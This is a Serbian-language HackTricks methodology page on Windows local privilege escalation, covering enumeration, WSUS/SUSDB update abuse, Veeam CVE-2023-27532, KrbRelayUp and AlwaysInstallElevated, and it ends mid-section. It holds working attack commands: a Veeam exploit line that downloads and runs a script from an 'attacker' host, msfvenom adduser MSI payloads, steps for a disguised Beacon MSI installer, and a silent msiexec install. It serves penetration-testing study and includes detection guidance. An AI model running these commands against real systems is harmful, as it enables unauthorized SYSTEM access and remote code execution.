# Eskalacija lokalnih privilegija u Windowsu

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za eskalaciju lokalnih privilegija u Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windowsu iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije takođe se oslanja na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata prezentaciju o eskalaciji privilegija u Windowsu održanu na konferenciji DerbyCon.<sup>[[5]](#references)</sup>

## Osnove Windowsa

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Više informacija o ACLs - DACLs/SACLs/ACEs potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windowsu, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole Windowsa

U Windowsu postoje različite stvari koje mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što počnete sa enumeracijom radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **mehanizme** **odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može da omogući da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Zaštita administratora / tiha elevacija UIAccess

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL bez upita kada se zaobiđu AppInfo provere bezbedne putanje. Pogledajte namenski tok rada za zaobilaženje UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra za pristupačnost u Secure Desktop okruženju može se zloupotrebiti za proizvoljno pisanje u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windowsa uvele su i LPE putanju **SMB arbitrary-port**, u kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti za verziju Windowsa (proverite i instalirane zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti za određene verzije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) koristan je za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje OS build, instalirana ažuriranja i odabrane potencijalne bezbednosne ispravke; proverite tačan proizvod i naknadna ažuriranja pre nego što zaključite da se rezultat odnosi na sistem.

Za lokalni exploit specifičan za određenu verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` obično vodi do 32-bitnog sistemskog direktorijuma, dok `%windir%\Sysnative` tom procesu omogućava pristup nativnom sistemskom direktorijumu. Alias nije dostupan 64-bitnom procesu. OS build ili kandidat za nedostajuću KB ispravku ne dokazuje da je sistem podložan exploit-u; uporedite pokrenuti build, instalirano ili naknadno ažuriranje, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

**Lokalno, koristeći sistemske informacije**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploit-a:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki kredencijali ili „Juicy“ informacije sačuvani u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell istorija

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuje podatke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u deljenu ili skrivenu fasciklu. Pre pregledanja transkripta proverite efektivnu putanju za izlaz i ACL datoteke: transkript može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript koji može da se pročita predstavlja trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u odgovarajućem kontekstu.

### PowerShell Module Logging

Detalji o izvršavanju PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi potpuni detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste pregledali poslednjih 15 događaja iz PowersShell logova, možete da izvršite:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj skripte tokom njenog izvršavanja, čime se osigurava dokumentovanje svakog bloka koda dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenzičku analizu i ispitivanje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint je pokazatelj za proveru mogućeg presretanja metapodataka o ažuriranjima. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj, kao i od klijentovog poverenja u ažuriranja i pravila za njihovu instalaciju. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete pokrenuti sledeće u cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Time se potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali se ne dokazuje da je presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama moguća. Kada je vrednost `0`, ova konkretna konfigurisana WSUS krajnja tačka nije izabrana tom smernicom.

Da biste iskoristili ove ranjivosti, možete da koristite alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Ovde pročitajte istraživanje:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da menjamo proxy podešavanja svog lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u postavkama programa Internet Explorer, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS servis koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS ime hosta i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za implementaciju provere sertifikata tipa trust-on-first-use. Ako korisnik veruje prikazanom sertifikatu i ako on ima ispravno ime hosta, servis će ga prihvatiti.

Ovu ranjivost možete da iskoristite pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja kojima upravlja WSUS administrator

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi servera `WSUS Administrators` i sve delegirane WSUS dozvole, a zatim utvrdite koju grupu klijenata bi primilo odobreno ažuriranje. [Microsoft zahteva privilegije WSUS Administrator za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [dokumentuje odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju privilegija, potvrdite da je kandidatsko ažuriranje potpisano i prihvaćeno, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB bazi: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja HTTP veze ka WSUS-u: preduslov je dovoljan pristup **procedurama uskladištenim u WSUS bazi podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedna praktična ulazna tačka je prosleđivanje naloga računara WSUS servera ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačni preduslovi zavise od postavke, zato najpre nabrojte dozvole `EXECUTE` umesto da pretpostavite da su potrebna administratorska prava za SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 na LDAP, SMB ili AD CS, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Napravite, ciljajte i odobrite ažuriranje

Tok rada sa prilagođenim ažuriranjem koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente sa preduslovima, lokalizovanim sadržajem i proširenim podacima | `spSaveXMLFragment` |
| Povežite sažetak sadržaja sa URL-om pod kontrolom napadača | `spSetBatchURL` |
| Nabrojte/napravite grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, sažeci, veličina i rukovalac `CommandLineInstallation` moraju da budu usklađeni u uvezenim metapodacima i fragmentima. Nakon dodeljivanja URL-a za sadržaj i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i primene umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET metode `VerifyFile` postavlja zastavicu provere sertifikata na `false` kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne proveri da li su bajtovi tekst ili ispravna ESD slika. Zato neizmenjeni PE fajl nazvan, na primer, `payload.exe.txt` može da prođe proveru sadržaja, a zatim da ga pokrene obrađivač instalacije ažuriranja preko komandne linije. Ovo je greška u politici/proveri tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno staging okruženje i automatizacija

Poziv `spDeployUpdate` pokreće WSUS preuzimanje registrovanog sadržaja. Origin mora da ispunjava HTTP očekivanja protokola BITS: samo dostupna URL adresa nije dovoljna jer prenos koristi početni `HEAD`/`GET` tok i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364` sa porukom da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za staging sadržaja. Minimalni poziv u autorizovanom labu je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nezavisno izvršavanje i persistence kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od politike. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema konfigurisanom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili nije dovršeno ponovo je ponuđen odmah nakon izlaska callback procesa, pa ponašanje pri ponovnim pokušajima može postati recurring execution persistence; to je upadljivo jer klijent prikazuje stanje neuspešnog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i hardening

Korisne mogućnosti za analizu na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e ažuriranja `.txt`/`.esd` i deployment-e koje su izvršili neočekivani principal-i (naročito računi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; korelišite verifikaciju sa ekstenzijom payload-a i magic bajtovima sadržaja, umesto da verujete sufiksu.
- Tražite ponovljene neuspehe i pokušaje instalacije Windows Update-a, kao i PE izvršavanje ili neočekivanu aktivnost child procesa/mreže iz sadržaja sa imenima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za database service gde je podržan i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` dozvole za procedure prilagođenih ažuriranja na minimum i revidirajte ih.

## Automatski update-eri trećih strana i Agent IPC (local privesc)

Mnogi enterprise agent-i izlažu localhost IPC površinu i privilegovani kanal za ažuriranje. Ako se enrollment može usmeriti na attacker server, a updater veruje lažnom root CA sertifikatu ili ima slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji SYSTEM service instalira. Pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect koriste osnovni backup service na **TCP/9401 po podrazumevanim podešavanjima**. [Veeam-ovo saopštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva iz konfiguracione baze podataka unutar perimetra backup mreže; odvojeni javni PoC demonstrira putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service može da se veže i izvan localhost-a, zato proverite njegovu stvarnu adresu i PID.

- **Recon**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` su indikatori, ali ne predstavljaju potpunu proveru zakrpa.
- **Minimalne ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; ranija izdanja su ranjiva. Sama četvorodelna verzija datoteke ne može da razlikuje nezakrpljen osnovni build od kasnije zakrpe na istim brojevima build-a. Pre nego što build na granici verzija proglasite ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC kao što je `VeeamHax.exe` zajedno sa potrebnim Veeam DLL datotekama u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socket-a:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Citirani PoC pokazuje izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelazak sa prijave sa nižim privilegijama na privilegovani upis u direktorijum, kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuću delegaciju i prava nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis key-credential podataka i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta relayed identiteta i nivoe autentifikacije i impersonation izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Zaštitni zid/OXID rutiranje i instalirane ispravke takođe mogu da utiču na ishod. Tretirajte permisivnu smernicu ili odgovarajući ACL kao potencijalni predmet provere; pasivno nabrajanje ne bi trebalo da izazove COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Više informacija o toku napada potražite na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvrše) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate Meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz PowerUP-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste naučili kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da upakujete „**.bat**“ fajl ako samo želite da **izvršavate** **komandne linije**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer“ u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, za lokaciju izaberite **`C:\privesc`**, označite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** iz **x86** u **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Time ćete osigurati da se Beacon payload izvrši čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI-ja

Da biste **u pozadini** izvršili **instalaciju** zlonamernog `.msi` fajla:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja revizije

Ova podešavanja određuju šta se **beleži**, zato treba da obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnog administratora ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
